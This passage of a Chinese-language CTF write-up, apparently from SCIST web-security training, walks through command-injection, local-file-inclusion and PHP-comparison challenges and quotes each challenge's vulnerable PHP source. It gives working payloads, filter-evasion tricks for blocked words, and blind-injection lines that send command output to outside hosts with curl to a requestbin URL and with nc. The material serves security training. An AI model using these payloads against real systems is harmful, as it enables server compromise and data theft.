class="string">&quot;fla*&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| c\at /fla*</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`head /fl\ag` ` 內可以直接執行指令</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; c\at /fla* 分號可以接更多指令</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; head /fl* 前者進行完直接接後者</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; c\at /fl* 前者丟入背景執行 後者繼續執行</span><br></pre></td></tr></table></figure><blockquote><p>如果想看更多跳脫方式，可以參考 @MuMu 在 <code>Baby CMDi</code> 的題解</p></blockquote><h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><h2 id="vtim-cmdi"><a href="#vtim-cmdi" class="headerlink" title="vtim_cmdi"></a>vtim_cmdi</h2><p><code>http://140.110.112.32:31339/index.php</code></p><p>也是command injection。<code>;</code>似乎會被擋掉，但可以用<code>||</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|| ls .</span><br><span class="line"></span><br><span class="line">Here&#39;s your header :</span><br><span class="line">index.nginx-debian.html</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure><p>翻找一下就可以看到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|| cat &#x2F;flag&#x2F;Flag&#x2F;flag</span><br></pre></td></tr></table></figure><blockquote><p>source code</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;HTTP Header Reader v0.008&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; size&#x3D;&quot;50&quot; name&#x3D;&quot;url&quot; placeholder&#x3D;&quot;URL&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;from&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; str_replace(&quot;;&quot;, &quot;\;&quot;, $_POST[&#39;url&#39;]);</span><br><span class="line">$output &#x3D; shell_exec(&quot;curl -I -X GET &quot;.$url);</span><br><span class="line">if($output !&#x3D; &quot;&quot;)&#123;</span><br><span class="line">    echo &quot;&lt;h3&gt;Here&#39;s your header :&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">    $array &#x3D; explode(&quot;\n&quot;,$output);</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    foreach($array as $str) &#123;</span><br><span class="line">       echo $str;</span><br><span class="line">       echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h2><p>先注意到網址 會發現他讀取網頁的方式是用GET<br>所以可以很輕易的在網址指定檔案</p><p>是 LFI 比較大的問題是 不知道檔案名稱 又不知道檔案位址<br>所以就要開始通靈 </p><p>跳過通靈的階段 flag 是放在 /flag<br>所以依照上面所說 在網址後面加上 <code>?page=../../../../flag</code> 即可<br>最低至少要跳4層 最高無限層都可以<br>發現沒辦法直接讀/flag</p><h2 id="BABY-CMDi"><a href="#BABY-CMDi" class="headerlink" title="BABY CMDi"></a>BABY CMDi</h2><p>稍微麻煩一點的黑箱題<br>貌似被擋了不少東西</p><p>看到題目 先跟著他的要求輸入 IP</p><p><img src="https://i.imgur.com/o8oyMS7.png"></p><p>看起來是很正常的 <code>ping $_POST[&#39;ip&#39;]</code><br>測試了一下 發現以下幾個東西會被擋掉</p><p><code>&amp; | ; cat flag `</code></p><p>那就來試一下 <code>$(sleep 3)</code><br>成功的讓網頁 sleep 了 3 秒 表示這樣是可行的</p><p>那就試試看 <code>$(ls)</code> 發現並沒有回傳東西<br>可以猜測這題並不會把 system 的運行結果回顯在網頁上<br>於是要嘗試讓執行結果輸出到自己這邊</p><p>開始建構 Payload<br>這邊使用的是 <a href="https://requestbin.net/">https://requestbin.net</a> </p><p>開一個 private 的 RequestBin</p><p><img src="https://i.imgur.com/tfz1uP3.png"></p><p>那就開始建構 payload 吧</p><p>首先先讓他 curl 我的 RequestBin</p><p><code>$(curl http://requestbin.net/r/1frffe51)</code></p><p>接著讓他把 command 的執行結果用 POST 的方式傳到我的 RequestBin 上<br>這邊先示範 ls 當前資料夾</p><p><code>$(curl -d &quot;$(ls ./)&quot; http://requestbin.net/r/1frffe51)</code></p><blockquote><p>若是 <code>-d $(ls ./)</code> 沒加上 “”<br>會導致執行結果若是出現換行就會出現 Error<br>第一行之後的每一行都會被當成新的 command 來執行</p></blockquote><p>回到 RequestBin 上 refresh 就會看到 ls 的結果了</p><p><img src="https://i.imgur.com/Ewqnn7O.png"></p><p>接著會遇到兩個問題</p><ol><li>這題會擋掉 cat</li><li>這題也會擋掉 flag</li></ol><p>那麼針對這兩點來分別解決</p><ol><li><p>cat 迴避方式</p><ul><li><code>head</code> 讀取檔案</li><li><code>diff</code> 比較檔案</li><li><code>c\at</code> 反斜線迴避</li><li><code>c&#39;&#39;at</code> 引號內空值</li><li><code>od</code> 8 進位讀取檔案<ul><li>-a 輸出 ascii </li></ul></li><li><code>bzmore</code> 讀取檔案</li><li><code>/???/??t</code> == <code>/usr/cat</code></li><li><code>grep</code> 搜尋檔案內符合條件的字串<ul><li><code>-i</code> 忽略大小寫</li><li><code>-P</code> 配合正規表達式</li><li><code>-r</code> 讀取當前資料夾下所有檔案 並且尋找符合的結果</li></ul></li><li><code>tail</code> 讀取檔案最後的部分</li><li><code>cut</code> 讀取檔案特定範圍<ul><li>-b 輸出特定範圍的 bytes<ul><li><code>-b n</code> 輸出第 n 個字</li><li><code>-b n-</code> 第 n 到最後一個字</li><li><code>-b n-m</code> 輸出 n ~ m 的字</li><li><code>-b -m</code> 輸出 m 前面的字</li></ul></li></ul></li><li><code>sed</code> 文字內容處理<ul><li><code>sed &#39;r&#39; &lt;file&gt;</code> 讀取檔案</li></ul></li></ul></li><li><p>flag 迴避方式</p><ul><li><code>./f*</code> == <code>./fl*</code> == <code>./fla*</code> == <code>./flag</code></li><li><code>./f???</code> == <code>./flag</code> == <code>./flxx</code></li><li><code>./fl\ag</code></li><li><code>./fl$&#123;wtf&#125;ag</code> == <code>./fl&#39;&#39;ag</code> wtf 未被賦值 所以為 null </li><li><code>a=fl b=ag $&#123;a&#125;$&#123;b&#125;</code></li><li>使用 <code>grep -r</code> 不需要加上檔名 只需接上要尋找的字串</li></ul></li><li><p>綜合技</p><ul><li><code>/???/c?? ./f???</code></li><li><code>/u*r/*d ./f?*</code></li><li><code>grep -iP &quot;&#123;[a-zA-Z0-9_]*&#125;&quot; fl\ag</code></li><li><code>diff ./fl* /etc/passwd</code></li><li><code>grep -r &quot;&#123;&quot;</code></li></ul></li></ol><blockquote><p>補充 : 用 Python Flask 和 webhook 建立簡單 request 接收器</p><p>首先先建立一個 python 檔</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">        body = request.get_data(as_text=<span class="literal">True</span>)</span><br><span class="line">        print(body)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    port = int(os.environ.get(<span class="string">&#x27;PORT&#x27;</span>, <span class="number">80</span>))</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=port)</span><br></pre></td></tr></table></figure><p>這個 python 可以幫我們把 Flask run 起來，並且在 <code>0.0.0.0:80</code> 上執行</p><p>接下來要新增一個 webhook 將連結導向我們的本機端，這裡使用 ngrok<br>要先下載好 ngrok 喔!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok http 80</span><br></pre></td></tr></table></figure><p>最後只需要將前面 curl 的連結改成在 ngrok 上看到的連結即可<br><img src="https://i.imgur.com/4DxqNv4.png"></p><p>最後我們的結果可以在 python 中看到<br><img src="https://i.imgur.com/PNl0NM3.png"></p></blockquote><blockquote><p>source code</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Baby CMDi&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input name&#x3D;&quot;ip&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Enter IP&quot; &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&#39;REQUEST_METHOD&#39;] &#x3D;&#x3D;&#x3D; &#39;POST&#39; &amp;&amp; isset($_POST[&#39;ip&#39;])) &#123;</span><br><span class="line"> $waf &#x3D; array(&quot;&amp;&quot;, &quot;|&quot;, &quot;;&quot;, &quot;&#96;&quot;, &quot;&gt;&quot;, &quot;\t&quot;, &quot;\r&quot;, &quot;\n&quot;, &quot;cat&quot;, &quot;flag&quot;);</span><br><span class="line"> foreach($waf as $banner)&#123;</span><br><span class="line">        if(stripos($_POST[&#39;ip&#39;], $banner) !&#x3D;&#x3D; FALSE) die(&quot;Get Out of Here&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> $result &#x3D; shell_exec(&quot;ping -c 3 &quot; . $_POST[&#39;ip&#39;]);</span><br><span class="line"> echo &quot;&lt;pre&gt;&quot; . $result . &quot;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><h2 id="MyPHP"><a href="#MyPHP" class="headerlink" title="MyPHP"></a>MyPHP</h2><blockquote><p>Point : php中array的特性～sha1[] = NULL</p></blockquote><p><a href="https://www.php.net/manual/en/types.comparisons.php">PHP Comparisons Table</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;user.php&quot;</span>);</span><br><span class="line"><span class="comment">// $users = Array(&#x27;admin&#x27;=&gt;&#x27;xxxx&#x27;, ...)</span></span><br><span class="line"></span><br><span class="line">$user = $_GET[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">$pass = $_GET[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user) &amp;&amp; <span class="keyword">isset</span>($pass)) &#123;</span><br><span class="line">    <span class="keyword">if</span>($users[$user] === sha1($pass))</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Q______________Q&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if的比較是 “===” 不能運用弱型別，要讓它都是NULL。<br>輸入 <code>http://140.110.112.32:4010/?user=-1&amp;pass[]=</code></p><h2 id="youtube-viewer"><a href="#youtube-viewer" class="headerlink" title="youtube_viewer"></a>youtube_viewer</h2><blockquote><p>解法一 : nc</p></blockquote><p>首先看到題目<br>一個youtube 載入器?<br>輸入youtube 影片上最後段的url 題目就會幫忙把影片讀取出來</p><p>猜測code：</p><figure class="highlight plain"><figcaption><span>-i 'xxx/[input]/xxx'``` or</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;curl -i &quot;xxx&#x2F;[input]&#x2F;xxx&quot;&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">可控的在中間那邊 </span><br><span class="line">應該是Blind Command Injection</span><br><span class="line">開始建構payload </span><br><span class="line"></span><br><span class="line">1. 先閉合前面</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39;&#96;&#96;&#96;</span><br><span class="line">2. 把後面也處理好</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39;&#39;&#96;&#96;&#96;</span><br><span class="line">3. 連接前後</span><br><span class="line">&#96;&#96;&#96;&#39; + &amp;payload &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;</span><br><span class="line">4. 加上要執行的cmd</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39; + $payload || ls -al &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;</span><br><span class="line">5. 因為結果不會print 出來 所以要回傳到自己的server</span><br><span class="line">&#x3D;&#x3D;&gt; &#96;&#96;&#96;&#39; + $payload || ls -al | nc ctf.bitx.tw 1234 &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line">**&#96;&#96;&#96;nc ctf.bitx.tw 1234&#96;&#96;&#96;**</span><br><span class="line">是拿來跟server 建立聊天室用的</span><br><span class="line"></span><br><span class="line">server上要執行</span><br><span class="line">**&#96;&#96;&#96;nc -l 1234&#96;&#96;&#96;**</span><br><span class="line"></span><br><span class="line">最終payload </span><br><span class="line">**&#96;&#96;&#96;&#39; + $payload || ls -al | cat &#x2F;flag | nc ctf.bitx.tw 1234 &amp;&amp; $payload &#x3D; &#39;&#96;&#96;&#96;**</span><br><span class="line"></span><br><span class="line">&gt; 解法二 : double quote ( 解法解釋請見 [BABY CMDi](https:&#x2F;&#x2F;hackmd.io&#x2F;feH6s4g3S0GAAuONsg3s0Q?both#BABY-CMDi)</span><br><span class="line"></span><br><span class="line">payload: &#96;&#39;&quot;$(curl http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;12zvlvr1 --data &quot;$(ls -ahl &#x2F;)&quot;)&quot;&#39;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; source code</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;htmlembedded&#x3D;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;https:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;IM+Fell+French+Canon+SC&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body style&#x3D;&quot;background-color: #fefad0;font-family: &#39;IM Fell French Canon SC&#39;, serif;font-size:20px&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Youtube Viewer&lt;&#x2F;h1&gt;</span><br><span class="line"></span><br><span class="line">Give me a valid youtube id:</span><br><span class="line">&lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;v&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">Example: uCLEq9V0-Yk</span><br><span class="line">&lt;br&gt;</span><br><span class="line">I will check your input is valid youtube id or not.</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        $default&#x3D;&quot;uCLEq9V0-Yk&quot;;</span><br><span class="line">        if(isset($_GET[&#39;v&#39;])) &#123;</span><br><span class="line">                $tmp &#x3D; $_GET[&#39;v&#39;];</span><br><span class="line">                $res &#x3D; shell_exec(&quot;curl -i &#39;https:&#x2F;&#x2F;img.youtube.com&#x2F;vi&#x2F;$tmp&#x2F;0.jpg&#39;&quot;);</span><br><span class="line">                if(strpos($res, &quot;404 Not Found&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Q___Q  Your input seems invalid.&lt;&#x2F;h3&gt;&lt;br&gt;&quot;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        $default &#x3D; $tmp;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id&#x3D;&quot;ytplayer&quot; type&#x3D;&quot;text&#x2F;html&quot; width&#x3D;&quot;640&quot; height&#x3D;&quot;360&quot;</span><br><span class="line">  src&#x3D;&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;&lt;?php echo $default; ?&gt;?autoplay&#x3D;0&quot;</span><br><span class="line">  frameborder&#x3D;&quot;0&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!-- hint: backend will download&#x2F;view the youtube video image and check it exist or not. --&gt;</span><br><span class="line">&lt;!-- Try more payload --&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>協作者</p><blockquote><p>[name=MuMu]<br>[name=Koios1143]<br>[name=nella17]</p></blockquote><h6 id="tags-Web-SCIST"><a href="#tags-Web-SCIST" class="headerlink" title="tags: Web SCIST"></a>tags: <code>Web</code> <code>SCIST</code></h6>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
